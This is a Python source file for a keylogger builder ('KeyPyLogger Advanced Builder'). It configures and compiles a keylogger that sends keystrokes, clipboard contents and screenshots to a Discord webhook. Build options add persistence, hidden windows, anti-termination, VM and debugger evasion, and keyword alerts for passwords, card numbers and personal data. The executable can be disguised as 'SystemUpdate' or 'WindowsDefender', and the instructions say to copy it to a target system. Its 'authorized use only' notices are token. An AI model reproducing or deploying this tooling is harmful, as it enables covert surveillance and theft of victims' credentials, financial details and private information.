#!/usr/bin/env python3
"""
KeyPyLogger Advanced Builder - Configuration and Compilation Tool v2.0
This tool creates configured versions of the keylogger with advanced features
"""

import os
import sys
import shutil
import re
from pathlib import Path


class AdvancedKeyLoggerBuilder:
    def __init__(self):
        self.base_dir = Path(__file__).parent
        self.template_file = self.base_dir / "keylogger_advanced.py"
        self.modules_dir = self.base_dir / "modules"
        self.output_dir = self.base_dir / "build"

    def validate_webhook(self, webhook_url):
        """Validate Discord webhook URL format"""
        pattern = r'https://discord\.com/api/webhooks/\d+/[\w-]+'
        if not re.match(pattern, webhook_url):
            print("[!] WARNING: URL doesn't match Discord webhook format")
            confirm = input("Continue anyway? (y/n): ")
            return confirm.lower() == 'y'
        return True

    def build(self, config):
        """
        Build a configured keylogger with advanced features

        Args:
            config (dict): Configuration dictionary

        Returns:
            bool: Success status
        """
        print("\n" + "=" * 70)
        print("KeyPyLogger Advanced Builder v2.0")
        print("=" * 70)

        # Validate webhook
        if not self.validate_webhook(config['webhook_url']):
            print("[!] Build cancelled")
            return False

        # Read template
        try:
            with open(self.template_file, 'r', encoding='utf-8') as f:
                content = f.read()
        except Exception as e:
            print(f"[!] Error reading template: {e}")
            return False

        # Replace configuration placeholders
        content = content.replace('WEBHOOK_URL_PLACEHOLDER', config['webhook_url'])
        content = content.replace('SEND_INTERVAL = 60', f'SEND_INTERVAL = {config["send_interval"]}')

        # Configure advanced features
        content = content.replace('ENABLE_PERSISTENCE = False',
                                  f'ENABLE_PERSISTENCE = {config.get("persistence", False)}')
        content = content.replace('ENABLE_CLIPBOARD = False',
                                  f'ENABLE_CLIPBOARD = {config.get("clipboard", False)}')
        content = content.replace('ENABLE_SCREENSHOTS = False',
                                  f'ENABLE_SCREENSHOTS = {config.get("screenshots", False)}')
        content = content.replace('SCREENSHOT_INTERVAL = 300',
                                  f'SCREENSHOT_INTERVAL = {config.get("screenshot_interval", 300)}')
        content = content.replace('ENABLE_KEYWORD_ALERTS = False',
                                  f'ENABLE_KEYWORD_ALERTS = {config.get("keyword_alerts", False)}')
        content = content.replace('KEYWORD_LISTS = []',
                                  f'KEYWORD_LISTS = {config.get("keyword_lists", [])}')
        content = content.replace('ENABLE_SELF_PROTECTION = False',
                                  f'ENABLE_SELF_PROTECTION = {config.get("self_protection", False)}')
        content = content.replace('ENABLE_HEALTH_MONITORING = False',
                                  f'ENABLE_HEALTH_MONITORING = {config.get("health_monitoring", False)}')
        content = content.replace('PROGRAM_NAME = "SystemUpdate"',
                                  f'PROGRAM_NAME = "{config.get("program_name", "SystemUpdate")}"')

        # Create output directory
        self.output_dir.mkdir(exist_ok=True)

        # Copy modules directory
        output_modules_dir = self.output_dir / "modules"
        if output_modules_dir.exists():
            shutil.rmtree(output_modules_dir)

        shutil.copytree(self.modules_dir, output_modules_dir)

        # Write configured file
        output_name = config.get('output_name', 'keylogger_configured.py')

        # Ensure .py extension
        if not output_name.endswith('.py'):
            output_name += '.py'

        output_path = self.output_dir / output_name

        try:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(content)

            # Make executable on Unix systems
            if os.name != 'nt':
                os.chmod(output_path, 0o755)

            print(f"\n[+] Successfully built configured keylogger!")
            print(f"[+] Output: {output_path}")
            print(f"[+] Webhook: {config['webhook_url'][:50]}...")
            print(f"\n[*] Configuration Summary:")
            print(f"    Send Interval: {config['send_interval']} seconds")
            print(f"    Persistence: {'✓' if config.get('persistence') else '✗'}")
            print(f"    Clipboard: {'✓' if config.get('clipboard') else '✗'}")
            print(f"    Screenshots: {'✓' if config.get('screenshots') else '✗'}")
            print(f"    Keyword Alerts: {'✓' if config.get('keyword_alerts') else '✗'}")
            print(f"    Self-Protection: {'✓' if config.get('self_protection') else '✗'}")
            print(f"    Health Monitoring: {'✓' if config.get('health_monitoring') else '✗'}")
            print("\n[*] Next steps:")
            print(f"    1. Copy build/ folder to target system")
            print(f"    2. Install dependencies: pip install -r requirements.txt")
            print(f"    3. Run: python build/{output_name}")
            print("\n[!] Remember: Only use on authorized systems!")

            return True

        except Exception as e:
            print(f"[!] Error writing output file: {e}")
            return False

    def build_executable(self, config):
        """
        Build executable using PyInstaller

        Args:
            config (dict): Configuration dictionary

        Returns:
            bool: Success status
        """
        import subprocess

        print("\n" + "=" * 70)
        print("KeyPyLogger Executable Builder v2.0")
        print("=" * 70)

        # First build the Python script
        if not self.build(config):
            return False

        # Determine executable name
        script_name = config.get('output_name', 'keylogger_configured.py')
        if not script_name.endswith('.py'):
            script_name += '.py'

        exe_name = config.get('program_name', 'SystemUpdate')
        script_path = self.output_dir / script_name

        print(f"\n[*] Building executable with PyInstaller...")
        print(f"[*] This may take a few minutes...")

        # PyInstaller command
        cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--onefile',  # Single executable
            '--name', exe_name,  # Executable name
            '--distpath', str(self.output_dir / 'dist'),
            '--workpath', str(self.output_dir / 'build_temp'),
            '--specpath', str(self.output_dir),
            '--clean',
        ]

        # Add noconsole on Windows for stealth
        if sys.platform == 'win32' and config.get('self_protection', False):
            cmd.append('--noconsole')

        # Add modules as hidden imports
        cmd.extend([
            '--hidden-import', 'pynput',
            '--hidden-import', 'pynput.keyboard',
            '--hidden-import', 'pynput.mouse',
            '--hidden-import', 'requests',
            '--hidden-import', 'pyperclip',
            '--hidden-import', 'PIL',
            '--hidden-import', 'PIL.Image',
            '--hidden-import', 'PIL.ImageGrab',
            '--hidden-import', 'psutil',
            # CRITICAL: Include modules folder in the executable
            '--add-data', f'{str(self.output_dir / "modules")}{os.pathsep}modules',
        ])

        # Add Windows-specific imports
        if sys.platform == 'win32':
            cmd.extend([
                '--hidden-import', 'win32com',
                '--hidden-import', 'win32com.client',
                '--hidden-import', 'win32event',
                '--hidden-import', 'win32api',
                '--hidden-import', 'winerror',
                '--hidden-import', 'winreg',
            ])

        # Add the script path
        cmd.append(str(script_path))

        try:
            # Run PyInstaller
            result = subprocess.run(
                cmd,
                check=True,
                capture_output=True,
                text=True,
                cwd=str(self.base_dir)
            )

            # Clean up temporary files
            build_temp = self.output_dir / 'build_temp'
            if build_temp.exists():
                shutil.rmtree(build_temp)

            spec_file = self.output_dir / f'{exe_name}.spec'
            if spec_file.exists():
                spec_file.unlink()

            # Get executable path
            exe_extension = '.exe' if sys.platform == 'win32' else ''
            exe_path = self.output_dir / 'dist' / f'{exe_name}{exe_extension}'

            if exe_path.exists():
                print(f"\n[+] ✓ Successfully built executable!")
                print(f"[+] Executable: {exe_path}")
                print(f"[+] Size: {exe_path.stat().st_size / 1024 / 1024:.2f} MB")
                print(f"\n[*] Configuration Summary:")
                print(f"    Program Name: {exe_name}")
                print(f"    Persistence: {'✓' if config.get('persistence') else '✗'}")
                print(f"    Clipboard: {'✓' if config.get('clipboard') else '✗'}")
                print(f"    Screenshots: {'✓' if config.get('screenshots') else '✗'}")
                print(f"    Keyword Alerts: {'✓' if config.get('keyword_alerts') else '✗'}")
                print(f"    Self-Protection: {'✓' if config.get('self_protection') else '✗'}")
                print(f"    Health Monitoring: {'✓' if config.get('health_monitoring') else '✗'}")
                print(f"\n[*] Next steps:")
                print(f"    1. Copy {exe_path} to target system")
                print(f"    2. Run directly (no Python required!)")
                print(f"    3. Executable will handle all features automatically")
                print(f"\n[!] Remember: Only use on authorized systems!")

                return True
            else:
                print(f"[!] Executable not found at expected location: {exe_path}")
                return False

        except subprocess.CalledProcessError as e:
            print(f"\n[!] PyInstaller failed!")
            print(f"[!] Error: {e}")
            if e.output:
                print(f"[!] Output: {e.output}")
            if e.stderr:
                print(f"[!] Stderr: {e.stderr}")
            return False

        except Exception as e:
            print(f"\n[!] Error building executable: {e}")
            return False

    def interactive_build(self):
        """Interactive configuration builder"""
        print("\n" + "=" * 70)
        print("KeyPyLogger Advanced Interactive Builder v2.0")
        print("=" * 70)
        print("LEGAL WARNING: This tool is for educational and authorized testing only!")
        print("=" * 70)

        config = {}

        # Basic Configuration
        print("\n" + "=" * 70)
        print("BASIC CONFIGURATION")
        print("=" * 70)

        # Get webhook URL
        print("\n[*] Discord Webhook Configuration")
        print("[*] Create a webhook in Discord:")
        print("    1. Go to Server Settings > Integrations > Webhooks")
        print("    2. Click 'New Webhook'")
        print("    3. Copy the webhook URL")

        config['webhook_url'] = input("\n[?] Enter Discord webhook URL: ").strip()

        if not config['webhook_url']:
            print("[!] Webhook URL is required!")
            return False

        # Get send interval
        print("\n[*] Send Interval Configuration")
        send_interval_input = input("[?] Send interval in seconds (default: 60): ").strip()

        try:
            config['send_interval'] = int(send_interval_input) if send_interval_input else 60
        except ValueError:
            print("[!] Invalid interval, using default (60)")
            config['send_interval'] = 60

        # Advanced Features
        print("\n" + "=" * 70)
        print("ADVANCED FEATURES CONFIGURATION")
        print("=" * 70)

        # Persistence
        print("\n[*] 1. Persistence (Auto-start on boot)")
        print("    Installs the keylogger to start automatically on system boot")
        print("    Windows: Registry/Startup Folder | Linux: Systemd/Crontab")
        response = input("[?] Enable persistence? (y/n): ").strip().lower()
        config['persistence'] = response == 'y'

        # Clipboard
        print("\n[*] 2. Clipboard Monitoring")
        print("    Monitors and logs clipboard content (copy/paste operations)")
        response = input("[?] Enable clipboard monitoring? (y/n): ").strip().lower()
        config['clipboard'] = response == 'y'

        # Screenshots
        print("\n[*] 3. Screenshot Capture")
        print("    Periodically captures screenshots of the desktop")
        response = input("[?] Enable screenshot capture? (y/n): ").strip().lower()
        config['screenshots'] = response == 'y'

        if config['screenshots']:
            interval_input = input("[?] Screenshot interval in seconds (default: 300): ").strip()
            try:
                config['screenshot_interval'] = int(interval_input) if interval_input else 300
            except ValueError:
                config['screenshot_interval'] = 300

        # Keyword Alerts
        print("\n[*] 4. Keyword Alerts")
        print("    Sends alerts when specific keywords are detected")
        print("    Available presets:")
        print("      - credentials: passwords, usernames, tokens")
        print("      - financial: credit cards, bank accounts")
        print("      - personal_info: SSN, addresses, phone numbers")
        print("      - corporate: confidential, trade secrets")
        print("      - technical: databases, servers, admin")
        response = input("[?] Enable keyword alerts? (y/n): ").strip().lower()
        config['keyword_alerts'] = response == 'y'

        if config['keyword_alerts']:
            print("\n[?] Select keyword lists (comma-separated):")
            print("    Options: credentials, financial, personal_info, corporate, technical")
            print("    Example: credentials,financial")
            lists_input = input("[?] Keyword lists: ").strip()

            if lists_input:
                config['keyword_lists'] = [l.strip() for l in lists_input.split(',')]
            else:
                config['keyword_lists'] = ['credentials']

        # Self-Protection
        print("\n[*] 5. Self-Protection")
        print("    Implements anti-tampering mechanisms:")
        print("      - Disables Ctrl+C termination")
        print("      - Hides console window")
        print("      - File integrity monitoring")
        print("      - Single instance enforcement")
        print("      - VM/Debugger detection")
        response = input("[?] Enable self-protection? (y/n): ").strip().lower()
        config['self_protection'] = response == 'y'

        # Health Monitoring
        print("\n[*] 6. Health Monitoring")
        print("    Monitors process health and sends periodic status updates")
        print("    Includes CPU, memory, uptime information")
        response = input("[?] Enable health monitoring? (y/n): ").strip().lower()
        config['health_monitoring'] = response == 'y'

        # Program Name
        print("\n[*] Program Name Configuration")
        print("    This name is used for persistence entries and process identification")
        print("    Examples: SystemUpdate, WindowsDefender, UpdateService")
        name_input = input("[?] Program name (default: SystemUpdate): ").strip()
        config['program_name'] = name_input if name_input else "SystemUpdate"

        # Output Name
        print("\n[*] Output Configuration")
        output_input = input("[?] Output filename (default: keylogger_configured.py): ").strip()
        config['output_name'] = output_input if output_input else "keylogger_configured.py"

        # Build executable option
        print("\n[*] Build Options")
        print("    1. Python script (requires Python on target)")
        print("    2. Standalone executable (no Python required)")

        build_type = input("\n[?] Choose build type (1 or 2, default: 1): ").strip()

        if build_type == "2":
            # Build executable
            return self.build_executable(config)
        else:
            # Build Python script
            return self.build(config)

    def command_line_build(self, args):
        """Build from command line arguments"""
        config = {
            'webhook_url': args[0],
            'send_interval': int(args[1]) if len(args) > 1 else 60,
            'output_name': args[2] if len(args) > 2 else 'keylogger_configured.py',
            'persistence': True,
            'clipboard': True,
            'screenshots': True,
            'screenshot_interval': 300,
            'keyword_alerts': True,
            'keyword_lists': ['credentials', 'financial'],
            'self_protection': True,
            'health_monitoring': True,
            'program_name': 'SystemUpdate'
        }

        return self.build(config)


def main():
    """Main entry point"""
    builder = AdvancedKeyLoggerBuilder()

    if len(sys.argv) > 1:
        # Command line mode
        if sys.argv[1] == '--help' or sys.argv[1] == '-h':
            print("KeyPyLogger Advanced Builder v2.0")
            print("\nUsage:")
            print("  Interactive mode: python builder_advanced.py")
            print("  Quick mode:       python builder_advanced.py <webhook_url> [interval] [output_name]")
            print("\nExamples:")
            print('  python builder_advanced.py  # Interactive mode (recommended)')
            print('  python builder_advanced.py "https://discord.com/api/webhooks/..." 60 keylogger.py')
            print("\nFeatures in v2.0:")
            print("  ✓ Persistence (auto-start)")
            print("  ✓ Clipboard monitoring")
            print("  ✓ Screenshot capture")
            print("  ✓ Keyword alerts")
            print("  ✓ Self-protection")
            print("  ✓ Health monitoring")
            sys.exit(0)

        builder.command_line_build(sys.argv[1:])
    else:
        # Interactive mode
        builder.interactive_build()


if __name__ == "__main__":
    main()
